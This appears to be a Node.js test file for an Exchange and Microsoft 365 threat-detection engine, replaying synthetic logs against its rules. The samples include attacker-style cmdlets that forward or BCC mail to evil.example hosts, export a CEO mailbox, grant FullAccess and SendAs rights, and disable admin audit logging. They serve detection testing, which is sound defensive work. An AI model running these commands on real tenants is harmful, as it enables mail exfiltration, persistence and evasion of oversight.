// Copyright (c) 2026 Citynet Work and Zyberon Information Technology, Saudi Arabia. All rights reserved. Proprietary and confidential - see LICENSE.
'use strict';
// End-to-end for the Exchange (on-prem + hybrid) rules: raw synthetic records → core parser router (engine/parse)
// → detector with the whole built-in pack. Skipped when the core Exchange parsers are not present.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { createDetector } = require('../engine/detect/engine');
const { createIntel } = require('../engine/detect/intel');
const { loadBuiltinRules } = require('../engine/detect/ruleset');
const { U } = require('./detect-fixtures-exchange');

const PARSE = path.join(__dirname, '..', 'engine', 'parse');
const have = fs.existsSync(path.join(PARSE, 'exchange.js')) && fs.existsSync(path.join(PARSE, 'iis.js'));
const skip = !have && 'core Exchange parsers not present';
const T = Date.UTC(2026, 8, 29, 10, 0, 0);
const iso = (ms) => new Date(ms).toISOString();

function run(items) {
  const { parse } = require(path.join(PARSE, 'index.js'));
  const intel = createIntel({ watch: false });
  intel.add('internal-mail-domains', ['corp-internal.example']);
  const out = [];
  const d = createDetector({ rules: loadBuiltinRules(), onAlert: (a) => out.push(a), intel });
  let i = 0;
  for (const [line, meta] of items) {
    const ev = parse(line, Object.assign({ collector: 'http', src_id: 'synthetic', peer_ip: '10.0.0.2', rts: T + i++ }, meta));
    if (!ev.id) ev.id = `x${i}`;
    d.onEvent(ev);
  }
  assert.equal(d.stats().errors, 0);
  return out;
}
const firedIds = (alerts) => new Set(alerts.filter((a) => !a.update).map((a) => a.rule_id));
const m365 = (o) => [JSON.stringify(Object.assign({ CreationTime: iso(T).replace('Z', ''), Workload: 'Exchange', UserId: 'admin@example.sa', ClientIP: '203.0.113.40:51000', ResultStatus: 'True' }, o)), { src_type: 'm365', collector: 'm365' }];
const cmd = (Operation, params, o) => m365(Object.assign({ RecordType: 1, Operation, ObjectId: 'ceo', Parameters: Object.entries(params).map(([Name, Value]) => ({ Name, Value })) }, o || {}));
const winEx = (cmdlet, params, eid = 1) => [JSON.stringify({ Channel: 'MSExchange Management', ProviderName: 'MSExchange CmdletLogs', EventID: eid, Computer: 'EX01.example.local',
  TimeCreated: iso(T), Level: 4, EventData: { Data0: cmdlet, Data1: params, Data2: 'example.local/Users/exadmin' } }), { src_type: 'windows', collector: 'agent' }];
const iisLine = (url, o = {}) => {
  const q = url.indexOf('?');
  const stem = q < 0 ? url : url.slice(0, q);
  const query = q < 0 ? '-' : url.slice(q + 1);
  return [`2026-09-29 ${o.time || '10:00:00'} 10.0.0.5 ${o.method || 'GET'} ${stem} ${query} 443 ${o.user || '-'} ${o.ip || '198.51.100.66'} Mozilla/5.0+(Windows+NT+10.0) - ${o.status || 200} 0 0 15`, { src_type: 'iis', collector: 'syslog-tcp' }];
};
const msgtrk = (i, sender, connector, ev = 'SEND') => [`${iso(T + i * 3000)},10.0.0.20,EX01,198.51.100.25,mx.external.example,,${connector},SMTP,${ev},${1000 + i},<m${i}@example.sa>,guid-${i},r${i}@external.example,250 2.0.0 OK,4096,1,,,Quarterly figures,${sender},${sender},,Originating,,,,,,,`, { src_type: 'exchange', collector: 'syslog-tcp' }];

test('Exchange Online admin + mailbox audit records (Management Activity API)', { skip }, () => {
  const items = [
    cmd('New-InboxRule', { Name: '.', ForwardTo: 'x@evil.example', DeleteMessage: 'True' }),
    cmd('Set-Mailbox', { Identity: 'ceo', ForwardingSmtpAddress: 'smtp:ceo.backup@mail.example' }),
    cmd('Set-Mailbox', { Identity: 'cfo', ForwardingSmtpAddress: 'smtp:cfo@corp-internal.example' }, { UserId: 'other-admin@example.sa' }),
    cmd('Add-MailboxPermission', { Identity: 'ceo', User: 'attacker@example.sa', AccessRights: 'FullAccess' }),
    cmd('New-ManagementRoleAssignment', { Role: 'ApplicationImpersonation', User: 'svc-app@example.sa' }),
    cmd('Set-InboundConnector', { Identity: 'Inbound from partner', RequireTls: 'False' }),
    ...Array.from({ length: 5 }, (_, i) => m365({ RecordType: 50, Operation: 'MailItemsAccessed', UserId: 'delegate@example.sa', MailboxOwnerUPN: `owner${i}@example.sa`,
      ClientIPAddress: '203.0.113.41', OperationCount: 1, OperationProperties: [{ Name: 'MailAccessType', Value: 'Bind' }] })),
  ];
  const alerts = run(items);
  const fired = firedIds(alerts);
  for (const id of ['SENTRA-EXO-001', 'SENTRA-EXO-002', 'SENTRA-EXO-003', 'SENTRA-EXO-006', 'SENTRA-EXO-007', 'SENTRA-EXO-008', 'SENTRA-EXO-010']) assert.ok(fired.has(id), `${id} not fired (fired: ${[...fired].join(', ')})`);
  const fwd = alerts.filter((a) => a.rule_id === 'SENTRA-EXO-002');
  assert.equal(fwd.length, 1, 'forwarding to an internal domain (intel internal-mail-domains) is not alerted');
});

test('on-prem MSExchange Management cmdlet events', { skip }, () => {
  const alerts = run([
    winEx('New-MailboxExportRequest', '-Mailbox ceo -FilePath \\\\fileserver\\pst$\\ceo.pst'),
    winEx('New-TransportRule', '-Name "Audit" -SentToScope NotInOrganization -BlindCopyTo "collector@evil.example"'),
    winEx('Add-RoleGroupMember', '-Identity "Organization Management" -Member mallory'),
    winEx('Set-AdminAuditLogConfig', '-AdminAuditLogEnabled $false'),
    winEx('Set-OrganizationRelationship', '-Identity "O365 to On-premises" -MailboxMoveEnabled $true'),
    winEx('Add-RecipientPermission', '-Identity cfo -Trustee mallory -AccessRights SendAs'),
    winEx('Set-InboxRule', '-Identity "bob\\r1" -MoveToFolder "bob:\\RSS Feeds" -MarkAsRead $true'),
    winEx('Get-MailboxExportRequest', '', 1),
  ]);
  const fired = firedIds(alerts);
  for (const id of ['SENTRA-EXO-016', 'SENTRA-EXO-004', 'SENTRA-EXO-005', 'SENTRA-EXO-006', 'SENTRA-EXO-007', 'SENTRA-EXO-017', 'SENTRA-EXO-008', 'SENTRA-EXO-003', 'SENTRA-EXO-001']) assert.ok(fired.has(id), `${id} not fired (fired: ${[...fired].join(', ')})`);
  assert.equal(alerts.filter((a) => a.rule_id === 'SENTRA-EXO-016').length, 1, 'Get-MailboxExportRequest is not an export');
});

test('message tracking: external SEND burst (hybrid connector excluded)', { skip }, () => {
  const items = [
    ...Array.from({ length: 100 }, (_, i) => msgtrk(i, 'sales1@example.sa', 'EX01\\Internet Send Connector')),
    ...Array.from({ length: 150 }, (_, i) => msgtrk(i, 'sales3@example.sa', 'Outbound to Office 365 - 1b2c3d4e')),
  ];
  const alerts = run(items);
  const burst = alerts.filter((a) => a.rule_id === 'SENTRA-EXO-011' && !a.update);
  assert.equal(burst.length, 1);
  assert.equal(burst[0].group.user, 'sales1@example.sa');
});

test('Exchange front-end IIS logs: exploitation, /ecp spike, web shell', { skip }, () => {
  const items = [
    iisLine(U.pshell, { ip: '198.51.100.60' }),
    iisLine(U.plogon, { ip: '198.51.100.61' }),
    iisLine(U.shell, { ip: '198.51.100.62', method: 'POST' }),
    iisLine('/owa/auth/logon.aspx?replaceCurrent=1', { ip: '198.51.100.63' }),
    ...Array.from({ length: 100 }, (_, i) => iisLine(`/ecp/?r=${i}`, { ip: '198.51.100.64', time: `10:0${Math.floor(i / 60)}:${String(i % 60).padStart(2, '0')}`, status: 302 })),
  ];
  const alerts = run(items);
  const fired = firedIds(alerts);
  for (const id of ['SENTRA-EXO-012', 'SENTRA-EXO-013', 'SENTRA-EXO-014']) assert.ok(fired.has(id), `${id} not fired (fired: ${[...fired].join(', ')})`);
  assert.ok(!alerts.some((a) => a.rule_id === 'SENTRA-EXO-014' && a.group.src_ip === '198.51.100.63'), 'stock OWA logon page is not a web shell');
});
